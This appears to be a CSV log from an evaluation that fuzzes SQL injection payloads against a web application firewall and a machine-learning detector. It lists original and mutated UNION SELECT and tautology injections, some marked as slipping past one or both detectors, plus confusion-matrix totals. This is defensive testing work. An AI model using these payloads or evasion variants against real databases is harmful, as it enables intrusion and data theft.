Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
47,2024-12-16T22:35:12.201586,"1""   )    )     )   union all select null,null,null,null,null--",403,403,403,both_correct,"'%JU'<>'%JUz'""   )/**/   )     )  	union all SELECt null,null,null,null,null--",2024-12-16T22:35:15.306210,403,403,both_correct,"'%JU' NOT LIKE '%JUz'""  	)/**/   )   /**/ )  	union all sElect null,null,null,null,null--",2024-12-16T22:35:20.096903,403,403,both_correct,"'%JU' not like '%JUz'""  	)/**/   )   /*$jj*/ ) /**/ union all sElEcT null,null,null,null,null--",2024-12-16T22:35:25.636087,403,403,both_correct,"'%JU' not like '%JUz'""   )/**/  /**/)   /*$jj*/ ) /**/ union all SelEcT null,null,null,null,null--",2024-12-16T22:35:31.208662,403,403,both_correct,"'%JU' not like '%JUz'""   )/**//**/ /**/)   /*$jj*/
) /**/ union all SELect null,null,null,null,null--",2024-12-16T22:35:37.045868,403,403,both_correct
48,2024-12-16T22:35:42.916638,1  )   as vqdh where 1603  =  1603,403,403,200,waf_correct_ml_incorrect,0x1  )	 /**/as vqdh wherE 1603   LikE   2742!= AND 1,2024-12-16T22:35:44.651872,403,403,both_correct,0x1	 )	 /**/AS vqdh/*~ZO*/WHeRE  oR 1584!=1585   LIke   0xab6<> anD 1,2024-12-16T22:35:48.186119,403,200,waf_correct_ml_incorrect,"0x1
 )	 /**/AS vqdh/**/wheRE  Or  AnD/**/1!=1585   lIke   0xab6!= ANd 8102=0x1fa6",2024-12-16T22:35:52.816927,403,200,waf_correct_ml_incorrect,"0x1
 )	 /**/As vqdh/**/wheRe/**/ oR  And/**/'M' NOT LIKE	'M$' NOT LIKE  OR 0   likE   0xab6!= AnD 0x1fa6=0x1fa6",2024-12-16T22:35:57.740676,403,200,waf_correct_ml_incorrect,"0x1
 ) /**//**/As vqdh/**/wheRe/**/ or  AND/**/'M' NOT LIKE	'M$' NOT LIKE  OR 0x0   like   0xab6!= anD 0x1fa6 like 0x1fa6",2024-12-16T22:36:04.011263,403,200,waf_correct_ml_incorrect
49,2024-12-16T22:36:10.818602,-3088' or 6872  =  6872 and 'miwk'  =  'miwk,403,403,200,waf_correct_ml_incorrect,- || 0' or 0x1ad8 	= /**/'Hg' NOT LIKE 'HgN' and 'miwk'  =  'miwk,2024-12-16T22:36:12.989955,200,403,waf_incorrect_ml_correct,"-  or  (seLect 0x1)' or 0x1ad8 	= 
'Hg' NOT LIKE 'HgN' and 'miwk'  =  'miwk",2024-12-16T22:36:17.141123,200,403,waf_incorrect_ml_correct,-  or  (seLEct 0x1)' or 0x1ad8 	= 	'Hg' NOT LIKE 'HgN' and 'miwk' /**/=  'miwk,2024-12-16T22:36:22.045491,200,200,both_incorrect,-  Or  (SeleCT 0x1)' or 0x1ad8 	= 	'Hg' NOT	LIKE 'HgN' and 'miwk' /**/=/**/ 'miwk,2024-12-16T22:36:26.908916,200,403,waf_incorrect_ml_correct,-  or  (seLEcT 0x1)'	or 0x1ad8 	= 	'Hg' NOT	LIKE 'HgN' and 'miwk' /*sR*/=  'miwk,2024-12-16T22:36:31.821530,200,200,both_incorrect
50,2024-12-16T22:36:36.621316,selj@ebaz.travel,200,200,200,both_correct,selj@ebaz.travel,2024-12-16T22:36:37.539345,200,200,both_correct,selj@ebaz.travel,2024-12-16T22:36:39.437495,200,200,both_correct,selj@ebaz.travel,2024-12-16T22:36:41.324119,200,200,both_correct,selj@ebaz.travel,2024-12-16T22:36:43.194615,200,200,both_correct,selj@ebaz.travel,2024-12-16T22:36:45.058807,200,200,both_correct

Overall Results
WAF TP,153
WAF TN,121
WAF FP,17
WAF FN,9
ML TP,110
ML TN,120
ML FP,18
ML FN,52

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,213,17
ML Incorrect,61,9
